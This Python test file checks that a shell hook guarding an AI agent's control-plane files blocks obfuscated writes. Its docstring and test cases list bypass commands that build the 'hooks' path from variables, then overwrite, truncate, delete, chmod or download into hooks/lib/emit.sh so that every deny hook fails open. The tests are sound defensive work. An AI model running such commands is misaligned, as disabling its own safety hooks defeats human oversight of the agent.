#!/usr/bin/env python3
"""C-1: control-plane write protection must close the variable-expansion gap.

The baseline regex matches literal `hooks/`, `scripts/`, `.claude/` paths and
some dynamic forms (`$VAR/hooks/`, `$(pwd)/hooks/`). It misses commands whose
write target is BUILT via variable assignment to a control-plane string:

    D=ho; D=${D}oks; echo evil > $D/lib/emit.sh        # writes to hooks/lib/emit.sh

When such a write reaches install targets it overwrites hooks/lib/emit.sh,
which makes emit_deny / emit_ask collapse to `{}` (allow) and every deny hook
in the framework fails open. Full review charter, axis A, finding C-1.

Detection strategy (Task 1, v1.6.1):
  Static expansion is undecidable, so we fail-safer with `ask` (NOT deny):
  if the command contains BOTH a variable assignment AND a write operation
  whose target uses a variable reference, route to ask. The user confirms in
  the legitimate `OUT=/tmp/x; > $OUT` case; the bypass is intercepted
  because `D=…; > $D/lib/emit.sh` matches the same heuristic.

PoCs (must NOT return `{}` allow):
  - D=ho; D=${D}oks; echo evil > $D/lib/emit.sh
  - echo evil > "${HOOKS_DIR:-hooks}/lib/emit.sh"
  - X=hooks; Y=${X}; echo evil > ${Y}/lib/emit.sh
  - p=h; p=${p}ooks; cp /dev/null $p/lib/emit.sh
  - D=h; D=${D}ooks; sed -i "s/x/y/" $D/lib/emit.sh
  - D=h; D=${D}ooks; truncate -s0 $D/lib/emit.sh
  - D=h; D=${D}ooks; install -m 644 /dev/null $D/lib/emit.sh
  - D=h; D=${D}ooks; dd of=$D/lib/emit.sh if=/dev/null
  - D=h; D=${D}ooks; python3 -c "open('$D/lib/emit.sh','w').write('x')"

Allow-list (must return `{}`):
  - echo "hello"                              # no variables, no write to var
  - MY_VAR=safe make build                    # assign but no write redirect
  - D=h; echo $D                              # assign + use but no write
  - echo $HOME > /tmp/x.txt                   # write + var but no assign
  - npm test                                  # routine
  - pytest tests/                             # routine
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]


def _scratch_root() -> tempfile.TemporaryDirectory:
    """Stand up a tmpdir with a fake STATUS.md (so the hook does not allow
    on missing STATUS), the hook, and the lib it sources."""
    tmp = tempfile.TemporaryDirectory()
    p = Path(tmp.name)
    (p / "docs").mkdir()
    (p / "docs" / "STATUS.md").write_text(
        "---\nframework: aegis\nmode: Dev\nphase: implement\n"
        "task_type: feature\n---\n", encoding="utf-8")
    hooks_dir = p / "hooks"
    hooks_dir.mkdir()
    shutil.copy2(ROOT / "hooks" / "check-control-plane.sh",
                 hooks_dir / "check-control-plane.sh")
    lib_dir = hooks_dir / "lib"
    lib_dir.mkdir()
    for lib in ("extract-input.sh", "emit.sh"):
        (lib_dir / lib).symlink_to(ROOT / "hooks" / "lib" / lib)
    return tmp


def _hook(root: Path, cmd: str) -> str:
    payload = json.dumps({"tool_name": "Bash",
                          "tool_input": {"command": cmd}})
    r = subprocess.run(
        ["bash", str(root / "hooks" / "check-control-plane.sh")],
        input=payload, capture_output=True, text=True, cwd=str(root))
    return r.stdout


_ALLOW = "{}"
_PERMISSION_DENY = '"permissionDecision":"deny"'
_PERMISSION_ASK = '"permissionDecision":"ask"'


def _is_blocked(out: str) -> bool:
    return _PERMISSION_DENY in out or _PERMISSION_ASK in out


class TestVarExpansionBypassBlocked(unittest.TestCase):
    """9 PoCs from the C-1 finding must all be intercepted (deny or ask)."""

    @classmethod
    def setUpClass(cls):
        cls._tmp = _scratch_root()
        cls.root = Path(cls._tmp.name)

    @classmethod
    def tearDownClass(cls):
        cls._tmp.cleanup()

    def _assert_blocked(self, cmd: str):
        out = _hook(self.root, cmd)
        self.assertTrue(_is_blocked(out),
                        f"PoC must NOT pass: cmd={cmd!r}, out={out[:200]!r}")

    def test_redirect_double_var_concat(self):
        self._assert_blocked(
            "D=ho; D=${D}oks; echo evil > $D/lib/emit.sh")

    def test_redirect_default_value_expansion(self):
        self._assert_blocked(
            'echo evil > "${HOOKS_DIR:-hooks}/lib/emit.sh"')

    def test_redirect_nested_var(self):
        self._assert_blocked(
            "X=hooks; Y=${X}; echo evil > ${Y}/lib/emit.sh")

    def test_cp_via_var(self):
        self._assert_blocked(
            "p=h; p=${p}ooks; cp /dev/null $p/lib/emit.sh")

    def test_sed_inplace_via_var(self):
        self._assert_blocked(
            'D=h; D=${D}ooks; sed -i "s/x/y/" $D/lib/emit.sh')

    def test_truncate_via_var(self):
        self._assert_blocked(
            "D=h; D=${D}ooks; truncate -s0 $D/lib/emit.sh")

    def test_install_via_var(self):
        self._assert_blocked(
            "D=h; D=${D}ooks; install -m 644 /dev/null $D/lib/emit.sh")

    def test_dd_of_via_var(self):
        self._assert_blocked(
            "D=h; D=${D}ooks; dd of=$D/lib/emit.sh if=/dev/null")

    def test_python_open_w_via_var(self):
        self._assert_blocked(
            "D=h; D=${D}ooks; python3 -c \"open('$D/lib/emit.sh','w').write('x')\"")

    # ---- grill-code A-Crit-1: extended WRITE_OP coverage ----
    # These utilities were missing from the v1.6.1 initial WRITE_OP regex.
    # Each can overwrite hooks/lib/emit.sh and collapse the moat just like
    # `> $D/lib/emit.sh`. They must trigger ASK via cmd_var_built_write.

    def test_ln_sf_via_var(self):
        self._assert_blocked(
            "D=h; D=${D}ooks; ln -sf /tmp/evil $D/lib/emit.sh")

    def test_curl_o_via_var(self):
        self._assert_blocked(
            "D=h; D=${D}ooks; curl -o $D/lib/emit.sh http://e")

    def test_wget_O_via_var(self):
        self._assert_blocked(
            "D=h; D=${D}ooks; wget -O $D/lib/emit.sh http://e")

    def test_rsync_via_var(self):
        self._assert_blocked(
            "D=h; D=${D}ooks; rsync /tmp/x $D/lib/emit.sh")

    def test_chmod_via_var(self):
        """chmod 000 disables a hook via permission rather than content,
        but the moat-collapse end-state is identical (the lib fails to
        source → fail-open). Must ASK."""
        self._assert_blocked(
            "D=h; D=${D}ooks; chmod 000 $D/lib/emit.sh")

    def test_rm_via_var(self):
        self._assert_blocked(
            "D=h; D=${D}ooks; rm $D/lib/emit.sh")


class TestNormalCommandsStillAllowed(unittest.TestCase):
    """The heuristic must NOT regress normal workflow commands."""

    @classmethod
    def setUpClass(cls):
        cls._tmp = _scratch_root()
        cls.root = Path(cls._tmp.name)

    @classmethod
    def tearDownClass(cls):
        cls._tmp.cleanup()

    def _assert_allowed(self, cmd: str):
        out = _hook(self.root, cmd)
        self.assertNotIn(_PERMISSION_DENY, out,
                         f"normal command was denied: cmd={cmd!r}, out={out!r}")
        self.assertNotIn(_PERMISSION_ASK, out,
                         f"normal command was asked: cmd={cmd!r}, out={out!r}")

    def test_plain_echo_allowed(self):
        self._assert_allowed('echo "hello"')

    def test_var_assignment_no_write_allowed(self):
        """MY_VAR=safe make build — assign without write to a var path."""
        self._assert_allowed("MY_VAR=safe make build")

    def test_var_use_no_write_allowed(self):
        """D=h; echo $D — assign + use but no write redirect to a var path."""
        self._assert_allowed("D=h; echo $D")

    def test_write_to_literal_path_allowed(self):
        """echo $HOME > /tmp/x.txt — uses var in arg but write target is literal."""
        self._assert_allowed("echo $HOME > /tmp/x.txt")

    def test_npm_test_allowed(self):
        self._assert_allowed("npm test")

    def test_pytest_allowed(self):
        self._assert_allowed("pytest tests/")


class TestExistingDirectFormsStillDeny(unittest.TestCase):
    """Regression guard: the pre-existing literal-path deny must keep firing."""

    @classmethod
    def setUpClass(cls):
        cls._tmp = _scratch_root()
        cls.root = Path(cls._tmp.name)

    @classmethod
    def tearDownClass(cls):
        cls._tmp.cleanup()

    def test_direct_literal_redirect_still_deny(self):
        out = _hook(self.root, "echo evil > hooks/lib/emit.sh")
        self.assertIn(_PERMISSION_DENY, out,
                      f"literal hooks/ write must deny: {out[:120]!r}")


if __name__ == "__main__":
    unittest.main()
